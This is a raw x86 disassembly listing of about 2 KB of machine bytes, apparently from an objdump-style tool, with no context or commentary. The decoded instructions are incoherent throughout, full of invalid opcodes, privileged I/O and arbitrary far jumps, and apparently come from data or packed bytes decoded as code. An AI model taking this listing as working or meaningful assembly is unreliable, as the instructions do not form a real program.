  424038:	(bad)  [eax+eiz*8]
  42403b:	mov    edi,0xb49cfc39
  424040:	gs adc ah,ch
  424043:	dec    ecx
  424044:	and    ah,BYTE PTR [edi-0x1c0fc9b9]
  42404a:	retf   
  42404b:	dec    edi
  42404c:	repz adc BYTE PTR [edx],bh
  42404f:	adc    al,0x4b
  424051:	or     BYTE PTR [ebp-0x29e4383c],dh
  424057:	push   0xe80c8b25
  42405c:	push   ecx
  42405d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42405e:	xor    ch,ch
  424060:	pop    ss
  424061:	mov    eax,ebx
  424063:	test   BYTE PTR [edx+0x5],cl
  424066:	xor    ah,BYTE PTR [ebp+0x799d6c12]
  42406c:	adc    ebx,DWORD PTR [esi+0x467ec00f]
  424072:	push   ecx
  424073:	daa    
  424074:	and    al,0x29
  424076:	or     esi,DWORD PTR [ebx+edx*4+0x3e9bd59]
  42407d:	dec    ebp
  42407e:	arpl   WORD PTR [esi+0x56],si
  424081:	mov    ebp,0xa2105f97
  424086:	ret    
  424087:	out    0xe5,eax
  424089:	sub    DWORD PTR ds:0xb42e82bc,edi
  42408f:	hlt    
  424090:	and    ch,BYTE PTR [edi+edi*1]
  424093:	(bad)  
  424095:	and    DWORD PTR [edi-0x2f],ebx
  424098:	pop    ss
  424099:	inc    ecx
  42409a:	rol    DWORD PTR [ebx+0x27],1
  42409d:	mov    esp,0xf91600b2
  4240a2:	adc    dl,0xe4
  4240a5:	inc    ebp
  4240a6:	xor    eax,0xf61a41c
  4240ab:	pop    esp
  4240ac:	sbb    al,0x99
  4240ae:	call   ebx
  4240b0:	xlat   BYTE PTR ds:[ebx]
  4240b1:	iret   
  4240b2:	or     ebx,DWORD PTR [esi+0x30998e]
  4240b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b9:	ss jmp 0x2702:0xb4fa1d69
  4240c1:	push   0xb
  4240c3:	(bad)  [ecx+0x2a]
  4240c6:	ja     0x4240b6
  4240c8:	mov    ecx,0x1cffe9a5
  4240cd:	cmp    DWORD PTR [esp+edx*1],ebx
  4240d0:	int    0x58
  4240d2:	inc    edi
  4240d3:	mov    ah,0x13
  4240d5:	mov    eax,ds:0xfa90534b
  4240da:	jl     0x4240b9
  4240dc:	inc    ebx
  4240dd:	jnp    0x42410f
  4240df:	fwait
  4240e0:	or     ecx,DWORD PTR [ebx-0x48]
  4240e3:	inc    esp
  4240e4:	xchg   esp,eax
  4240e5:	aad    0x97
  4240e7:	mov    ebx,0x52aba034
  4240ec:	popf   
  4240ed:	fnstsw WORD PTR [ebp+0x77]
  4240f0:	enter  0x80ca,0x89
  4240f4:	ret    
  4240f5:	outs   dx,DWORD PTR ds:[esi]
  4240f6:	xchg   esp,eax
  4240f7:	push   ebp
  4240f8:	dec    ebp
  4240f9:	fs adc al,0xe9
  4240fc:	cs jg  0x42408b
  4240ff:	xchg   ebp,eax
  424100:	popa   
  424101:	pop    esi
  424102:	inc    ecx
  424103:	push   cs
  424104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424105:	xchg   edi,eax
  424106:	mov    al,0xfe
  424108:	and    cl,bh
  42410a:	push   esp
  42410b:	(bad)  
  42410c:	xchg   ebx,eax
  42410d:	mov    al,ds:0xa2f6a95c
  424113:	out    dx,al
  424114:	xchg   ebp,eax
  424115:	hlt    
  424116:	sbb    esp,ebp
  424118:	or     cl,BYTE PTR [edx+ecx*1-0x51]
  42411c:	xchg   edx,eax
  42411d:	cmp    DWORD PTR [ecx-0x11],esp
  424120:	ret    0x22c7
  424123:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424124:	dec    esi
  424125:	mov    ebp,0x379f2f44
  42412a:	mov    bl,0x3c
  42412c:	daa    
  42412d:	or     al,0xd1
  42412f:	pop    ds
  424130:	push   ebp
  424131:	(bad)  
  424132:	jp     0x424127
  424134:	add    ah,BYTE PTR [ebx+0x7e]
  424137:	push   esi
  424138:	or     ch,BYTE PTR [ecx+0x642f389b]
  42413e:	xor    BYTE PTR [ecx-0x1124618d],al
  424144:	add    BYTE PTR [ebp-0x7e],bh
  424147:	push   esi
  424148:	aaa    
  424149:	cmp    DWORD PTR [ecx+esi*4+0xca66297],esi
  424150:	imul   ebx,DWORD PTR [eax+0x6f96a4cf],0x68
  424157:	mov    al,ds:0xa47ba7a5
  42415c:	es adc ecx,ebp
  42415f:	cli    
  424160:	fs pusha 
  424162:	push   esp
  424163:	jle    0x424127
  424165:	in     eax,0xb8
  424167:	and    al,0x3c
  424169:	dec    edi
  42416a:	loopne 0x4241a2
  42416c:	push   ebp
  42416d:	div    DWORD PTR [ebx-0x16]
  424170:	and    al,BYTE PTR [ebx+esi*1]
  424173:	and    DWORD PTR [edx+ecx*1],ecx
  424176:	scas   eax,DWORD PTR es:[edi]
  424177:	jbe    0x42413b
  424179:	mov    ds:0x399c7e2f,al
  42417e:	aaa    
  42417f:	jmp    0xe4e2:0xc054e56
  424186:	test   eax,0xbf0fedf4
  42418b:	jo     0x424167
  42418d:	mov    al,ds:0xae79d4b5
  424192:	xor    eax,DWORD PTR [ecx]
  424194:	inc    ebp
  424195:	stc    
  424196:	cmp    ebx,esi
  424198:	ds push ebx
  42419a:	imul   ebp,DWORD PTR [edx+0xf602921],0x72
  4241a1:	xlat   BYTE PTR ds:[ebx]
  4241a2:	retf   0x3b95
  4241a5:	sahf   
  4241a6:	imul   eax,DWORD PTR [edi-0x28ea4854],0x6d
  4241ad:	fnstcw WORD PTR [ebx+0x5b]
  4241b0:	and    esi,DWORD PTR [esi+eax*4-0xd]
  4241b4:	mov    ebp,ebx
  4241b6:	in     al,dx
  4241b7:	adc    eax,0xd4bf3a25
  4241bc:	ds int 0xcb
  4241bf:	mov    eax,?
  4241c1:	dec    ebp
  4241c2:	dec    eax
  4241c3:	mov    ebx,0xdf3b6423
  4241c8:	push   ss
  4241c9:	jns    0x424164
  4241cb:	cmp    ch,BYTE PTR [edi+0x50]
  4241ce:	aaa    
  4241cf:	sub    eax,0x1e5ba1fd
  4241d4:	ret    
  4241d5:	and    al,dl
  4241d7:	scas   al,BYTE PTR es:[edi]
  4241d8:	jns    0x424183
  4241da:	aam    0x7a
  4241dc:	ins    BYTE PTR es:[edi],dx
  4241dd:	popa   
  4241de:	mov    esp,0x1e28f7b4
  4241e3:	push   eax
  4241e4:	gs (bad) 
  4241e6:	adc    eax,0xeb988ceb
  4241eb:	addr16 sbb eax,0xc96f1e39
  4241f1:	out    0xb0,al
  4241f3:	outs   dx,BYTE PTR ds:[esi]
  4241f4:	jmp    0x3ba1:0x9dc4da29
  4241fb:	xchg   esp,eax
  4241fc:	sbb    dl,dl
  4241fe:	mov    ebp,0x9f0a2f8c
  424203:	sub    ch,BYTE PTR [ebp+0x54]
  424206:	lods   al,BYTE PTR ds:[esi]
  424207:	lds    eax,FWORD PTR [eax-0x3ce6b64e]
  42420d:	and    eax,0x466202df
  424212:	rol    BYTE PTR [eax],cl
  424214:	lds    esp,FWORD PTR [ebx+edi*8-0x1c113a5f]
  42421b:	sub    ebx,DWORD PTR [ecx]
  42421d:	jno    0x4241db
  42421f:	lea    esp,[edx+0x42f4bf0b]
  424225:	or     ecx,DWORD PTR [esi-0x4f2309b9]
  42422b:	dec    esi
  42422c:	inc    ecx
  42422d:	inc    ebx
  42422e:	sub    al,0x2d
  424230:	push   ecx
  424231:	mov    esi,0x49bc04bc
  424236:	mul    BYTE PTR [edi-0x12c0f3db]
  42423c:	int3   
  42423d:	fstp   TBYTE PTR [ecx+0x6e058e2]
  424243:	popa   
  424244:	cmp    DWORD PTR [edx-0x2f919b33],ebx
  42424a:	mov    bh,0xea
  42424c:	jg     0x4242af
  42424e:	xor    eax,DWORD PTR [ebx+0x15]
  424251:	fldenv es:[ecx]
  424254:	aam    0xa0
  424256:	jmp    0x4241dd
  424258:	fcmovb st,st(3)
  42425a:	data16 add al,0x93
  42425d:	popf   
  42425e:	mov    edx,0xbfe787be
  424263:	xor    al,0x5
  424265:	and    eax,0x55b6b0e6
  42426a:	sbb    al,0x1a
  42426c:	push   edi
  42426d:	in     al,dx
  42426e:	ror    ebx,0xfc
  424271:	in     al,dx
  424272:	mov    edx,0xb64d319d
  424277:	in     al,0x8c
  424279:	mov    dh,0x3c
  42427b:	and    al,0x85
  42427d:	loop   0x4242e0
  42427f:	repnz aas 
  424281:	fstp   TBYTE PTR [bp+di+0x393c]
  424286:	pop    ebx
  424287:	cmp    BYTE PTR [ebp+0x598fc832],ch
  42428d:	(bad)  
  42428e:	or     eax,0x360ea1f2
  424293:	inc    ecx
  424294:	mov    ds:0x88168bda,al
  424299:	jl     0x424256
  42429b:	test   BYTE PTR [esi+0x1e4a1f79],dh
  4242a1:	mov    DWORD PTR [edi+0x2760e7f9],edi
  4242a7:	mov    ah,BYTE PTR [ecx]
  4242a9:	jmp    0xa0bf1f8d
  4242ae:	push   esi
  4242af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242b0:	xor    al,0x6a
  4242b2:	std    
  4242b3:	push   ecx
  4242b4:	xchg   ecx,eax
  4242b5:	mov    dl,0x6f
  4242b7:	arpl   WORD PTR [esi-0x4f],sp
  4242ba:	xor    eax,0x6de37bc6
  4242bf:	jmp    0x4242df
  4242c1:	jmp    0x2886bf07
  4242c6:	mov    ecx,0x4d8048c9
  4242cb:	push   esp
  4242cc:	inc    ecx
  4242cd:	lahf   
  4242ce:	mov    ds:0x7a2c1c10,eax
  4242d3:	das    
  4242d4:	mov    WORD PTR [ecx-0x13251d07],cs
  4242da:	jnp    0x4242d6
  4242dc:	jb     0x424329
  4242de:	leave  
  4242df:	cli    
  4242e0:	add    al,0xa8
  4242e2:	sti    
  4242e3:	repnz cmp al,0x73
  4242e6:	lahf   
  4242e7:	push   cs
  4242e8:	mov    ebx,0xafebf8df
  4242ed:	dec    eax
  4242ee:	mov    dh,0xe4
  4242f0:	jno    0x4242b9
  4242f2:	and    al,0xa
  4242f4:	push   ss
  4242f5:	(bad)  
  4242f6:	jo     0x4242c4
  4242f8:	sbb    BYTE PTR [ebx],bh
  4242fa:	jp     0x424305
  4242fc:	pushf  
  4242fd:	cmp    BYTE PTR [ecx],al
  4242ff:	popa   
  424300:	jae    0x42435e
  424302:	mov    dh,0xf4
  424304:	mov    edi,0x4b5d87de
  424309:	mov    ecx,es
  42430b:	outs   dx,DWORD PTR ds:[esi]
  42430c:	push   ss
  42430d:	out    0xb9,al
  42430f:	inc    esp
  424310:	mov    esp,DWORD PTR [ebx+edx*2-0x4c]
  424314:	or     ecx,DWORD PTR [edx]
  424316:	mov    ebp,0x12b8f474
  42431b:	pushf  
  42431c:	add    eax,0x37ef6408
  424321:	pop    eax
  424322:	loopne 0x424352
  424324:	and    al,0x59
  424326:	push   edx
  424327:	aam    0x91
  424329:	rcr    BYTE PTR [edi-0x645c6d4e],1
  42432f:	sbb    BYTE PTR [ebp+0xb002d51],ah
  424335:	pop    ebx
  424336:	ins    DWORD PTR es:[edi],dx
  424337:	sub    dl,al
  424339:	mov    cl,0x9b
  42433b:	add    eax,0xbe50d149
  424340:	push   edi
  424341:	int    0x77
  424343:	mov    edi,0x6d9fc5c3
  424348:	in     eax,0xd9
  42434a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42434b:	hlt    
  42434c:	(bad)  
  42434d:	in     al,0x49
  42434f:	stc    
  424350:	fadd   DWORD PTR [edi-0x3f975360]
  424356:	fucom  st(4)
  424358:	ins    DWORD PTR es:[edi],dx
  424359:	cmc    
  42435a:	push   edx
  42435b:	lock push eax
  42435d:	pop    edi
  42435e:	mov    dl,0x3c
  424360:	mov    esi,0x25f3cdec
  424365:	mov    DWORD PTR [edi],edx
  424367:	xchg   esi,eax
  424368:	mov    ?,WORD PTR [esi-0x64763637]
  42436e:	or     esi,DWORD PTR [eax-0x4d]
  424371:	scas   eax,DWORD PTR es:[edi]
  424372:	add    cl,BYTE PTR [ebx-0x43e595c2]
  424378:	jge    0x4243f7
  42437a:	mov    cl,0x4
  42437c:	ja     0x424380
  42437e:	adc    dl,BYTE PTR [ecx+0x512c92e6]
  424384:	xor    esi,eax
  424386:	mov    esp,0xffa932ed
  42438b:	or     ebx,0x30
  42438e:	xchg   esi,eax
  42438f:	push   esi
  424390:	sbb    ah,BYTE PTR [ecx-0xf6601c3]
  424396:	call   0xffcb615d
  42439b:	and    eax,0x5a113c05
  4243a1:	loope  0x42437d
  4243a3:	daa    
  4243a4:	and    eax,0x2ff2d7a5
  4243a9:	pop    ebp
  4243aa:	dec    ecx
  4243ab:	sub    dl,ah
  4243ad:	pushf  
  4243ae:	std    
  4243af:	xchg   esp,eax
  4243b0:	lea    edx,[ebp+0x18bdf175]
  4243b6:	sub    DWORD PTR [edi-0x1b],0xe3fbc1d6
  4243bd:	in     al,dx
  4243be:	into   
  4243bf:	add    esi,DWORD PTR [ebx]
  4243c1:	sub    eax,0x68412784
  4243c6:	mov    dh,0x9
  4243c8:	mov    bh,0xc7
  4243ca:	fst    st(4)
  4243cc:	xor    eax,0xd841e9a7
  4243d1:	cdq    
  4243d2:	es ret 0x7326
  4243d6:	add    eax,0x2bb16ca
  4243db:	inc    edi
  4243dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243dd:	jl     0x4243ef
  4243df:	arpl   WORD PTR [eax+0x18752ebe],ax
  4243e5:	test   al,0x6f
  4243e7:	mov    dl,0x2c
  4243e9:	mov    cs,WORD PTR [edi-0x3f16c015]
  4243ef:	ret    0x8d56
  4243f2:	mov    esi,ebx
  4243f4:	jge    0x4243b3
  4243f6:	mov    bh,0xec
  4243f8:	and    DWORD PTR [ecx+0x7b],ebp
  4243fb:	cld    
  4243fc:	cmp    esp,DWORD PTR [ecx+esi*4-0x2e]
  424400:	add    edx,DWORD PTR [eax]
  424402:	pop    esp
  424403:	push   0x2f
  424405:	and    BYTE PTR ds:0x41f24f85,0xef
  42440c:	push   ss
  42440d:	jmp    0xc424c19e
  424412:	mov    al,0xc8
  424414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424415:	xchg   esp,eax
  424416:	pop    ebp
  424417:	xor    DWORD PTR [ecx+0x4c],0xffffffe8
  42441b:	retf   
  42441c:	adc    edi,DWORD PTR [edx+0x61acd6bc]
  424422:	mov    edi,0xaf1933d6
  424427:	dec    ebp
  424428:	mov    ebx,0xa017f9fa
  42442d:	inc    edi
  42442e:	nop
  42442f:	ficom  WORD PTR [ecx+0x4b66cbd0]
  424435:	in     al,0x39
  424437:	inc    esp
  424438:	mov    edi,0x60297f78
  42443d:	mov    ecx,0xc920c0b8
  424442:	mov    esp,0xf278456d
  424447:	and    BYTE PTR [edi],cl
  424449:	enter  0x5d3b,0x1f
  42444d:	loop   0x424463
  42444f:	mul    DWORD PTR [edx]
  424451:	lods   eax,DWORD PTR ds:[esi]
  424452:	jbe    0x4244a5
  424454:	sbb    ebp,ecx
  424456:	out    dx,al
  424457:	xchg   edi,eax
  424458:	aaa    
  424459:	stos   DWORD PTR es:[edi],eax
  42445a:	cli    
  42445b:	jns    0x42440c
  42445d:	int    0x2b
  42445f:	xchg   esi,eax
  424460:	fstp   DWORD PTR [edi]
  424462:	or     al,0xd4
  424464:	sbb    eax,0x1dbc4a15
  424469:	stc    
  42446a:	ss pop edi
  42446c:	adc    BYTE PTR [ebx],0x62
  42446f:	lods   eax,DWORD PTR ds:[esi]
  424470:	imul   ecx,edx,0x928aa38b
  424476:	cmp    al,0xee
  424478:	sbb    cl,al
  42447a:	fistp  QWORD PTR [ebx]
  42447c:	sbb    DWORD PTR [ecx+0xaf5b708],ebx
  424482:	fwait
  424483:	or     ebp,DWORD PTR [esi-0x61]
  424486:	sub    edi,edi
  424488:	stos   BYTE PTR es:[edi],al
  424489:	aas    
  42448a:	out    0x4e,al
  42448c:	mov    bl,0xa4
  42448e:	mov    ds:0xb33cf9a8,eax
  424493:	push   esp
  424494:	aaa    
  424495:	nop
  424496:	push   ss
  424497:	call   0xbb22:0xef645bf5
  42449e:	add    al,0x5
  4244a0:	push   ss
  4244a1:	leave  
  4244a2:	jo     0x424483
  4244a4:	xor    DWORD PTR [eax+0x1c4aee58],esp
  4244aa:	push   ebx
  4244ab:	inc    edx
  4244ac:	je     0x42447c
  4244ae:	mov    ebx,0xcce8ba67
  4244b3:	or     eax,0xdc5385a3
  4244b8:	mov    cl,cl
  4244ba:	adc    eax,0xcf93758b
  4244bf:	ss xchg edi,eax
  4244c1:	aam    0xb7
  4244c3:	fld    QWORD PTR [ebp+0x4bf16772]
  4244c9:	(bad)  
  4244ca:	or     bl,BYTE PTR fs:[edx]
  4244cd:	sbb    eax,ebx
  4244cf:	jmp    0x42454b
  4244d1:	push   0xa0bf2ce2
  4244d6:	fwait
  4244d7:	mov    dh,bl
  4244d9:	sub    DWORD PTR [edx+ecx*8-0x3c],eax
  4244dd:	arpl   WORD PTR [ebp+edi*1+0x66211d8d],ax
  4244e4:	outs   dx,DWORD PTR ds:[esi]
  4244e5:	sbb    eax,0x9d9fb4bd
  4244ea:	sub    ecx,eax
  4244ec:	test   al,0x3
  4244ee:	inc    ebp
  4244ef:	call   0x99d0:0x785c9352
  4244f6:	jnp    0x424502
  4244f8:	(bad)  
  4244f9:	and    ebx,ebx
  4244fb:	aas    
  4244fc:	and    DWORD PTR [eax-0x58493903],edx
  424502:	jae    0x424519
  424504:	xchg   ebp,eax
  424505:	lahf   
  424506:	dec    edi
  424507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424508:	and    bh,BYTE PTR [ecx-0x7c]
  42450b:	hlt    
  42450c:	push   edx
  42450d:	in     al,dx
  42450e:	int3   
  42450f:	xor    eax,DWORD PTR [edx-0x2c]
  424512:	sti    
  424513:	jne    0x424522
  424515:	or     eax,0x771af0bc
  42451a:	icebp  
  42451b:	arpl   WORD PTR [ebx],di
  42451d:	not    DWORD PTR ds:0x3b9b40ac
  424523:	pop    eax
  424524:	aam    0xb9
  424526:	pop    eax
  424527:	sbb    dl,bh
  424529:	fwait
  42452a:	sbb    edi,DWORD PTR [edi-0x593b3f54]
  424530:	fcmovnbe st,st(3)
  424532:	call   0xb3fcb9dd
  424537:	add    al,0xa
  424539:	sub    ecx,edi
  42453b:	and    BYTE PTR ds:0x14f20654,0xac
  424542:	call   0xd4bb6984
  424547:	jmp    0xa3a6:0x11303fa3
  42454e:	pop    ebx
  42454f:	dec    esi
  424550:	retf   0xa0df
  424553:	jle    0x424593
  424555:	das    
  424556:	repz dec ebp
  424559:	sub    dh,BYTE PTR [ebp+0x7141394]
  42455f:	adc    eax,0xe8eb9a1c
  424564:	xchg   ebx,eax
  424565:	xlat   BYTE PTR ds:[ebx]
  424566:	push   edx
  424567:	jle    0x4245b6
  424569:	cmc    
  42456a:	inc    esp
  42456b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42456c:	(bad)  
  42456d:	lock mov al,0xe4
  424570:	and    eax,0xe5ba19ce
  424575:	mov    esp,0x2d7de774
  42457a:	adc    BYTE PTR [ecx+0x6fe83919],dl
  424580:	adc    ah,BYTE PTR [edx]
  424582:	xchg   esi,eax
  424583:	sbb    al,0x86
  424585:	popf   
  424586:	sbb    esp,DWORD PTR [ebx]
  424588:	outs   dx,DWORD PTR ds:[esi]
  424589:	test   esp,ecx
  42458b:	add    al,0xc8
  42458d:	adc    bl,ch
  42458f:	adc    BYTE PTR [edi],dh
  424591:	ins    DWORD PTR es:[edi],dx
  424592:	mov    bh,0x64
  424594:	cwde   
  424595:	inc    ebp
  424596:	lods   al,BYTE PTR ds:[esi]
  424597:	jmp    0xe99a1c61
  42459c:	push   ecx
  42459d:	addr16 push ecx
  42459f:	push   esi
  4245a0:	sbb    ebx,DWORD PTR [ecx-0x5d]
  4245a3:	rcl    ch,1
  4245a5:	arpl   WORD PTR [edx+0x4c],cx
  4245a8:	xchg   edi,eax
  4245a9:	fs jge 0x42456c
  4245ac:	mov    edi,0xdb9a239c
  4245b1:	sbb    DWORD PTR [edi],0x99091b68
  4245b7:	fidiv  WORD PTR [eax]
  4245b9:	out    0xf3,eax
  4245bb:	cwde   
  4245bc:	xchg   edx,eax
  4245bd:	mov    ah,0x2b
  4245bf:	pop    es
  4245c0:	fild   DWORD PTR [edx+0x10]
  4245c3:	in     eax,dx
  4245c4:	pop    ss
  4245c5:	(bad)  [edi-0x3d46db8b]
  4245cb:	add    eax,0x3e5bf698
  4245d0:	mul    BYTE PTR [ebp-0x7b13db69]
  4245d6:	xchg   edi,eax
  4245d7:	aaa    
  4245d8:	add    bh,BYTE PTR [edx+0x2e]
  4245db:	and    BYTE PTR ds:0x6b6d2c8c,bl
  4245e1:	and    al,0x96
  4245e3:	repz cmp DWORD PTR [ebp+0x662c4efb],ebx
  4245ea:	pop    esp
  4245eb:	scas   eax,DWORD PTR es:[edi]
  4245ec:	pop    ecx
  4245ed:	cwde   
  4245ee:	ss test eax,0xb2fd291a
  4245f4:	push   ss
  4245f5:	cmp    al,0x98
  4245f7:	cmp    ecx,ebp
  4245f9:	pop    edi
  4245fa:	mov    WORD PTR [edx+edx*8-0x18],ss
  4245fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ff:	popf   
  424600:	jbe    0x424639
  424602:	lahf   
  424603:	jae    0x42461c
  424605:	jmp    0x2cb88962
  42460a:	push   eax
  42460b:	das    
  42460c:	cmp    al,0x63
  42460e:	or     al,0x25
  424611:	cdq    
  424612:	jg     0x42465d
  424614:	out    dx,eax
  424615:	rcl    DWORD PTR [edi],0x9f
  424618:	pop    ds
  424619:	pop    ecx
  42461a:	fnstsw WORD PTR [edx+eax*4]
  42461d:	stos   BYTE PTR es:[edi],al
  42461e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42461f:	out    dx,eax
  424620:	rcr    DWORD PTR [ebp-0x455ecae5],1
  424626:	std    
  424627:	mov    ebp,DWORD PTR [edi+0xf]
  42462a:	xor    ecx,DWORD PTR [ebp+0x24c674eb]
  424630:	(bad)  
  424631:	not    DWORD PTR [esi]
  424633:	jb     0x424683
  424635:	mov    ds:0x70dd00fb,eax
  42463a:	imul   eax,DWORD PTR [edi],0xffffff95
  42463d:	push   es
  42463e:	dec    esi
  424640:	in     al,0xd6
  424642:	sub    BYTE PTR ds:0x59198522,dl
  424648:	sti    
  424649:	mov    ds:0xebfe9fbb,al
  42464e:	loop   0x4245d4
  424650:	cmc    
  424651:	nop
  424652:	inc    esi
  424653:	jnp    0x424681
  424655:	sub    ebp,0xf81d0e04
  42465b:	adc    DWORD PTR [esi-0x63],esp
  42465e:	jnp    0x4245ff
  424660:	pushf  
  424661:	jl     0x424621
  424663:	fpatan 
  424665:	mov    ebp,0xdb785148
  42466a:	xlat   BYTE PTR ds:[ebx]
  42466b:	xchg   esp,eax
  42466c:	rcr    BYTE PTR [esi-0x6bc32011],0xc3
  424673:	sub    DWORD PTR [esi+0x71],edx
  424676:	mov    ch,0xa3
  424678:	and    edi,DWORD PTR [ecx]
  42467a:	cmc    
  42467b:	icebp  
  42467c:	sub    esi,DWORD PTR [eax-0x72]
  42467f:	adc    DWORD PTR [ecx-0x1e],ebp
  424682:	and    DWORD PTR [ebp+0x24],esp
  424685:	fwait
  424686:	(bad)  
  424687:	mov    bl,0x10
  424689:	fwait
  42468a:	hlt    
  42468b:	jnp    0x424673
  42468d:	(bad)  
  42468e:	cmp    BYTE PTR [edx],ah
  424690:	jg     0x4246ee
  424692:	adc    esp,DWORD PTR [ebx]
  424694:	repz xor DWORD PTR [eax],0x34
  424698:	mov    dl,0x8a
  42469a:	lods   al,BYTE PTR ds:[esi]
  42469b:	out    0x24,al
  42469d:	push   esp
  42469e:	mov    dh,0xe4
  4246a0:	scas   al,BYTE PTR es:[edi]
  4246a1:	(bad)  
  4246a3:	call   0xec89635d
  4246a8:	xor    ebx,DWORD PTR [eax]
  4246aa:	sbb    DWORD PTR es:[ebx],0x9
  4246ae:	add    al,0xc4
  4246b0:	pop    eax
  4246b1:	lea    edi,[eax]
  4246b3:	sbb    DWORD PTR [esp+ebx*4-0x391f4895],0xffffff86
  4246bb:	aam    0x2b
  4246bd:	arpl   WORD PTR [edi+0x3e],ax
  4246c0:	push   ss
  4246c1:	pop    ecx
  4246c2:	int    0x5b
  4246c4:	enter  0x6384,0xda
  4246c8:	rol    BYTE PTR [edi+0x19226def],1
  4246ce:	mov    eax,ebx
  4246d0:	inc    ecx
  4246d1:	xlat   BYTE PTR ds:[ebx]
  4246d2:	mov    edi,0xf7d04f46
  4246d7:	inc    ebx
  4246d8:	out    dx,al
  4246d9:	shl    ah,cl
  4246db:	inc    ebp
  4246dc:	aad    0xa6
  4246de:	push   cs
  4246df:	repnz mov eax,ds:0xc63e38aa
  4246e5:	lds    edx,FWORD PTR [ecx-0x31]
  4246e8:	dec    ecx
  4246e9:	vpaddq ymm3,ymm1,YMMWORD PTR [edx-0x1214bf3f]
  4246f1:	jp     0x4246ab
  4246f3:	repz and eax,ecx
  4246f6:	pop    ebx
  4246f7:	and    al,0xba
  4246f9:	mov    bl,0x1f
  4246fb:	xchg   esi,eax
  4246fc:	(bad)  
  4246fd:	pop    ss
  4246fe:	imul   ecx,ebx,0xfc540d24
  424704:	stc    
  424705:	fwait
  424706:	test   BYTE PTR [edi-0x27],bh
  424709:	push   es
  42470a:	mov    bl,0xc4
  42470c:	ror    al,0xac
  42470f:	jl     0x424706
  424711:	xchg   ebx,eax
  424712:	add    dl,dh
  424714:	les    esp,FWORD PTR [edx+0x5ce4066c]
  42471a:	mov    eax,ds:0x7bb925a4
  42471f:	loop   0x424783
  424721:	jbe    0x4246e2
  424723:	cmp    bl,BYTE PTR [esi]
  424725:	mov    ebx,DWORD PTR [ecx+edx*8+0x675af9ca]
  42472c:	jge    0x424731
  42472e:	mov    edx,0x67991c0c
  424733:	inc    esp
  424734:	push   esi
  424735:	frstor [eax-0x77]
  424738:	mov    ebx,0xae887c56
  42473d:	retf   0x412d
  424740:	and    cl,cl
  424742:	xchg   esi,eax
  424743:	and    eax,0x59078e07
  424748:	iret   
  424749:	xchg   ebp,eax
  42474a:	ret    
  42474b:	aam    0xfb
  42474d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42474e:	test   BYTE PTR [edx],dh
  424750:	and    BYTE PTR [eax+ebp*8],dl
  424753:	cmp    cl,al
  424755:	dec    edx
  424756:	mov    bl,0xa6
  424758:	in     eax,0xfd
  42475a:	or     al,0xf0
  42475c:	ficom  DWORD PTR [ebx-0x10]
  42475f:	scas   eax,DWORD PTR es:[edi]
  424760:	push   ds
  424761:	imul   edx,DWORD PTR [edx-0x6dfb007e],0x6ba12e05
  42476b:	mov    bl,0xc
  42476d:	cwde   
  42476e:	mov    ch,0xb0
  424770:	cmp    al,BYTE PTR [ebx+0xe]
  424773:	adc    DWORD PTR [edi+0x34888482],esi
  424779:	mov    esi,0xa88f49d9
  42477e:	out    dx,eax
  42477f:	mov    ah,0x33
  424781:	pushf  
  424782:	sti    
  424783:	(bad)  
  424785:	out    dx,eax
  424786:	sub    bl,BYTE PTR [ebp-0x1972d3c2]
  42478c:	sbb    dl,BYTE PTR [ebx]
  42478e:	jl     0x42471a
  424790:	pop    es
  424791:	out    dx,al
  424792:	add    esi,esi
  424794:	mov    dh,0xdf
  424796:	mov    edi,0x7c624544
  42479b:	in     al,dx
  42479c:	push   0x1eaeca7c
  4247a1:	or     DWORD PTR [ebx-0x7b490c62],edi
  4247a7:	enter  0xa733,0x2b
  4247ab:	cmp    eax,DWORD PTR [edi]
  4247ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247ae:	(bad)  
  4247af:	lods   eax,DWORD PTR ds:[esi]
  4247b0:	stos   BYTE PTR es:[edi],al
  4247b1:	neg    BYTE PTR [ecx+0x30]
  4247b4:	ja     0x4247f6
  4247b6:	loop   0x4247ac
  4247b8:	ss call 0xa57f:0x44c8c785
  4247c0:	test   BYTE PTR [ebx-0x6ad9798d],dh
  4247c6:	es add eax,0x25b19d1f
  4247cc:	adc    ch,ch
  4247ce:	lea    ebx,[esi-0x166d60b3]
  4247d4:	cmp    BYTE PTR [esi+ebp*8+0x61],dl
  4247d8:	push   esi
  4247d9:	push   ebp
  4247da:	fcmovnu st,st(1)
  4247dc:	pop    ss
  4247dd:	jmp    0xe0933f98
  4247e2:	pop    ds
  4247e3:	sub    al,0x30
  4247e5:	xchg   ecx,eax
  4247e6:	mov    bl,0xf4
  4247e8:	into   
  4247e9:	xor    BYTE PTR [edx+0x56a6d5bc],al
  4247ef:	repz aaa 
  4247f1:	stos   BYTE PTR es:[edi],al
  4247f2:	push   0xaf09495d
  4247f7:	sahf   
  4247f8:	fild   DWORD PTR [edx-0xc]
  4247fb:	shl    bl,1
  4247fd:	lods   al,BYTE PTR ds:[esi]
  4247fe:	jne    0x424868
  424800:	inc    ebp
  424801:	adc    eax,0x94dbe6c0
  424806:	ins    BYTE PTR es:[edi],dx
  424807:	jno    0x42482c
  424809:	pop    ecx
  42480a:	sbb    al,0xdc
  42480c:	out    0x18,eax
  42480e:	add    eax,0xcd5deb9a
  424813:	rcr    DWORD PTR [eax+ebp*4+0x67],cl
  424817:	adc    eax,0xbc39c912
  42481c:	adc    bl,BYTE PTR [ebx]
  42481e:	jmp    0x42482e
  424820:	mov    ah,BYTE PTR [edx-0x53226199]
  424826:	mov    ecx,0x2be8aef4
  42482b:	ss and cl,bh
  42482e:	mov    bl,0xb2
  424830:	loope  0x424840
  424832:	or     eax,ebp
  424834:	xor    al,0x39
  424836:	aas    
  424837:	sbb    BYTE PTR [ebp+0x15d5293b],ch
  42483d:	popf   
  42483e:	push   0x5e
